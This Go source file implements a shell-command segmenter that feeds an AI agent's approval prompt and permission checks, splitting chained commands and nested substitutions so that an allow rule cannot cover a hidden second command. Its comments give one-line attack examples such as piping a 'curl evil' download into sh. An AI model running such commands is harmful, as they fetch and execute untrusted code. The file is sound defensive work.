// Package shellseg splits compound shell commands into independently matched
// segments. Commands inside substitutions are also targets, so an outer allow
// cannot authorize a nested command with a separate risk profile.
//
// It is the single source of truth for "what are the distinct commands in
// this line." The agent's approval modal uses it to risk-flag each
// segment; the permissions evaluator uses it so a Bash allow-rule is
// matched per segment (a trailing `*` can't approve a chained
// `… ; curl evil | sh`). Keeping one implementation means the display and
// the security check can never drift apart.
//
// The output is suitable for matching and display — not for exact
// execution semantics. We surface what a tired human (or an over-broad
// allow rule) might miss, not reproduce a real shell parser.
package shellseg

import "strings"

// Segment is one piece of a compound command. Separator is the operator
// that PRECEDES this segment ("" for the first; "&&", "||", ";", or "|"
// thereafter).
type Segment struct {
	Text      string
	Separator string
}

// Split tokenizes cmd into trimmed, non-empty segments. Empty input (or
// input that is only separators/whitespace) yields nil.
func Split(cmd string) []Segment {
	if strings.TrimSpace(cmd) == "" {
		return nil
	}
	segments := splitOnSeparators(cmd)
	for i := range segments {
		segments[i].Text = strings.TrimSpace(segments[i].Text)
	}
	out := segments[:0]
	for _, s := range segments {
		if s.Text != "" {
			out = append(out, s)
		}
	}
	return out
}

// Texts is a convenience wrapper returning command texts. It includes the
// outer segments and recursively includes commands embedded in command
// substitutions and backticks, so an allow rule for the outer command cannot
// accidentally approve an unreviewed nested command.
func Texts(cmd string) []string {
	var out []string
	var collect func(string)
	collect = func(input string) {
		for _, s := range Split(input) {
			out = append(out, s.Text)
			for _, nested := range embeddedCommands(s.Text) {
				collect(nested)
			}
		}
	}
	collect(cmd)
	return out
}

// SafeTexts returns command targets and whether the command structure was
// complete enough for permission matching. Unclosed quotes/substitutions are
// marked unsafe so an allow rule cannot approve malformed shell input.
func SafeTexts(cmd string) ([]string, bool) {
	texts := Texts(cmd)
	return texts, balanced(cmd)
}

func balanced(cmd string) bool {
	var single, double, backtick bool
	paren := 0
	for i := 0; i < len(cmd); i++ {
		if cmd[i] == '\\' {
			i++
			continue
		}
		if !double && !backtick && cmd[i] == '\'' {
			single = !single
			continue
		}
		if !single && !backtick && cmd[i] == '"' {
			double = !double
			continue
		}
		if single || double {
			continue
		}
		if cmd[i] == '`' {
			backtick = !backtick
			continue
		}
		if !backtick && cmd[i] == '(' {
			paren++
		}
		if !backtick && cmd[i] == ')' {
			paren--
			if paren < 0 {
				return false
			}
		}
	}
	return !single && !double && !backtick && paren == 0
}

func embeddedCommands(cmd string) []string {
	var commands []string
	for i := 0; i < len(cmd); i++ {
		if cmd[i] == '\\' {
			i++
			continue
		}
		if cmd[i] == '`' {
			start := i + 1
			for j := start; j < len(cmd); j++ {
				if cmd[j] == '\\' {
					j++
					continue
				}
				if cmd[j] == '`' {
					if strings.TrimSpace(cmd[start:j]) != "" {
						commands = append(commands, cmd[start:j])
					}
					i = j
					break
				}
			}
			continue
		}
		if (cmd[i] != '$' && cmd[i] != '<' && cmd[i] != '>') || i+1 >= len(cmd) || cmd[i+1] != '(' {
			continue
		}
		start, depth := i+2, 1
		inSingle, inDouble := false, false
		for j := start; j < len(cmd); j++ {
			if cmd[j] == '\\' {
				j++
				continue
			}
			if !inDouble && cmd[j] == '\'' {
				inSingle = !inSingle
				continue
			}
			if !inSingle && cmd[j] == '"' {
				inDouble = !inDouble
				continue
			}
			if inSingle || inDouble {
				continue
			}
			switch cmd[j] {
			case '(':
				depth++
			case ')':
				depth--
				if depth == 0 {
					if strings.TrimSpace(cmd[start:j]) != "" {
						commands = append(commands, cmd[start:j])
					}
					i = j
					j = len(cmd)
				}
			}
		}
	}
	return commands
}

// lastNonSpaceByte returns the last non-whitespace byte of s, or 0 when s
// is empty/all whitespace. Used to tell a background `&` (separator) from
// the `&` in a `>&`/`2>&1` redirect.
func lastNonSpaceByte(s string) byte {
	for i := len(s) - 1; i >= 0; i-- {
		if s[i] != ' ' && s[i] != '\t' {
			return s[i]
		}
	}
	return 0
}

// splitOnSeparators is the tokenizer: a single-pass char scan tracking
// quote, escape, and substitution state. Returns segments with the
// separator that preceded each (empty for the first).
func splitOnSeparators(s string) []Segment {
	var (
		out      []Segment
		current  strings.Builder
		sep      = "" // the separator that came before `current`
		inSingle bool
		inDouble bool
		escape   bool
		// substitution depth — `$(...)` and backtick blocks are kept
		// intact so nested && etc. inside them don't split.
		parenDepth int
		inBack     bool
	)
	push := func() {
		out = append(out, Segment{Text: current.String(), Separator: sep})
		current.Reset()
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if escape {
			current.WriteByte(c)
			escape = false
			continue
		}
		if c == '\\' {
			current.WriteByte(c)
			escape = true
			continue
		}
		if !inSingle && !inDouble && !inBack && parenDepth == 0 {
			// Look for two-char separators first.
			if c == '&' && i+1 < len(s) && s[i+1] == '&' {
				push()
				sep = "&&"
				i++
				continue
			}
			if c == '|' && i+1 < len(s) && s[i+1] == '|' {
				push()
				sep = "||"
				i++
				continue
			}
			// A lone `&` is the background operator — a real command
			// separator (`go test & curl evil` runs both). It must be
			// split so a per-segment permission check sees the second
			// command; otherwise a trailing-`*` allow rule spans it. But
			// it is NOT a separator inside a redirect: `&>file` (next is
			// '>') or `2>&1` / `>&2` (preceding non-space char is '>') —
			// splitting those would mangle the redirect.
			if c == '&' {
				var next byte
				if i+1 < len(s) {
					next = s[i+1]
				}
				if next != '>' && lastNonSpaceByte(current.String()) != '>' {
					push()
					sep = "&"
					continue
				}
			}
			if c == ';' {
				push()
				sep = ";"
				continue
			}
			// A raw newline (outside quotes) sequences commands just like
			// `;`. Split so each line is its own segment for matching.
			if c == '\n' || c == '\r' {
				push()
				sep = ";"
				continue
			}
			if c == '|' {
				push()
				sep = "|"
				continue
			}
			if c == '$' && i+1 < len(s) && s[i+1] == '(' {
				parenDepth++
				current.WriteByte(c)
				current.WriteByte(s[i+1])
				i++
				continue
			}
			if c == '`' {
				inBack = true
				current.WriteByte(c)
				continue
			}
		}
		if parenDepth > 0 {
			if c == '(' {
				parenDepth++
			} else if c == ')' {
				parenDepth--
			}
		}
		if inBack && c == '`' {
			inBack = false
		}
		if !inDouble && !inBack && parenDepth == 0 && c == '\'' {
			inSingle = !inSingle
		}
		if !inSingle && !inBack && parenDepth == 0 && c == '"' {
			inDouble = !inDouble
		}
		current.WriteByte(c)
	}
	push()
	return out
}
